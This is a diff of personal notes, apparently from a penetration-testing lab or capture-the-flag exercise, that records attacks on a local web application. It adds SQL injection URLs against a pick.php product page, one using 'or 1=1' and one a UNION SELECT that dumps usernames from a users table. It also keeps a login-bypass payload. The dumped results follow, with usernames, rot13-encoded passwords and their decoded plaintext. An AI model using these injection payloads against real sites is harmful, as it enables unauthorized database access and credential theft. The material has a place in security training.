@@ -770,11 +770,13 @@ ip a
 192.168.28.181 WebApp
 
 
-
+http://127.0.0.1:41270/pick.php?product=7%20or%201=1
 
 
 
 10.50.35.1/login.php?username=Aaron' or 1='1 & passwd=Aaron' or 1='1
+
+
 
 Array
 (
@@ -798,4 +800,20 @@ Array
     [pass] => anotherpassword4THEages
 )
 1
+
+http://127.0.0.1:41270/pick.php?product=7%20%20Union%20Select%20username,name,user_id%20from%20users
+
+rot13 on the passwords to get actual password
+
+Item 	On Hand 	Price
+HAM 	32 	$15
+Aaron 	Aaron 	$1	apasswordyPa$$word 
+user2 	user2 	$2	EaglesIsARE78
+user3 	user3 	$3	Bob4THEEapples
+Lroth 	Lee_Roth 	$4
+ncnffjbeqlCn$$jbeq 	Aaron 	$1
+RntyrfVfNER78 	user2 	$2
+Obo4GURRnccyrf 	user3 	$3		Bob4THEEapples
+anotherpassword4THEages 	Lroth 
+
 
